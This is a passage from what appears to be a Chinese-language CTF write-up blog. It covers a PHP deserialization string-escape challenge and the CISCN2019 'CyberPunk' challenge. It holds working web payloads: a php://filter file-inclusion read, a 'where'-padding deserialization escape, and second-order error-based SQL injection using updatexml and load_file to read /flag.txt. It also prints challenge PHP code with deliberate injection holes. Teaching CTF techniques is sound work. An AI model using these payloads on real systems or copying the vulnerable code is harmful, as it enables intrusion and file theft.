alt="0AVpYn.md.png"></a></p><p>失败原因是这里对nickname有长度限制，直接用数组绕过<br>其次这里还有个坑，如果你传入的是nickname[],他的反序列化不是这样</p><pre><code>a:4:{s:5:&quot;phone&quot;;s:6:&quot;123123&quot;;s:5:&quot;email&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;s:3:&quot;aaa&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;}</code></pre><p>而是这样的</p><pre><code>a:4:{s:5:&quot;phone&quot;;s:6:&quot;123123&quot;;s:5:&quot;email&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:3:&quot;aaa&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;}</code></pre><p>所以终版构造的photo是这样的</p><pre><code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p>一共是三十四个字符。<br>由于代码对username的检测，每多一个where被替换为hacker，就多一个字符的位置，为了替换后构造的photo能成功的被挤出去，也就需要三十四个where。<br>综上，payload为</p><pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p>如图传入再访问profile.php,在源代码得到flag。</p><p><a href="https://imgchr.com/i/0AEasU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AEasU.png" srcset="/img/loading.gif" alt="0AEasU.png"></a></p><p><img src="https://s1.ax1x.com/2020/09/27/0Ae1de.png" srcset="/img/loading.gif" alt="0Ae1de.png"></p><h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><p><strong>考点：php伪协议、报错注入</strong></p><p>结合实事，来一道2077。</p><p>首页是个提交订单的页面，表单中提交姓名、电话、地址三个参数。下面还有几个订单管理的功能。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201129174439542.png" srcset="/img/loading.gif" alt="image-20201129174439542"></p><p>查看源码发现提示</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201129174455970.png" srcset="/img/loading.gif" alt="image-20201129174455970"></p><p>那就先试试用伪协议把源码读一读</p><p>payload:</p><pre><code>?file=php://filter/read=convert.base64-encode/resource=xxx.php</code></pre><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#change.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"订单修改成功"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"未找到订单!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#confirm.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//var_dump($_POST);</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$user_name</span><span class="token punctuation">.</span><span class="token string">"已提交订单"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span><span class="token punctuation">;</span>        <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$re</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"sss"</span><span class="token punctuation">,</span> <span class="token variable">$user_name</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">,</span> <span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$re</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$re</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"订单提交成功"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#delete.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'delete from `user` where `user_id`='</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"user_id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"订单删除成功"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"未找到订单!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#index.php</span><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// $file = $_GET["file"];</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/phar|zip|bzip2|zlib|data|input|%00/i"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'no way!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#search.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"&lt;p>姓名:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>&lt;p>, 电话:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>&lt;p>, 地址:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"未找到订单!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"信息不全"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>重点关注change.php。</p><p>这个过滤只是看起来很严谨，但实际上他只对user_name和phone做了过滤，而参数address却被放过了，只对它进行了转义。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span><span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>再向下看代码：</p><p>这一部分原本意图是更改地址，但却把旧地址作为old_address重新存入了数据库中，而且再次进行了查询。</p><p>也就是说，如果先提交一个有单引号之类字符的payload，再用随便一个数据把它顶替成old_address，那么payload就不会被addslashes函数限制，并且作为old_address被成功触发。</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//change.php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>结合报错注入，payload如下：</p><pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,50)),0x7e),1)#</code></pre><p>结果load_file就显示了后半截。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207172844718.png" srcset="/img/loading.gif" alt="image-20201207172844718"></p><p>再读下前面的</p><pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201207173052006.png" srcset="/img/loading.gif" alt="image-20201207173052006"></p><h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn 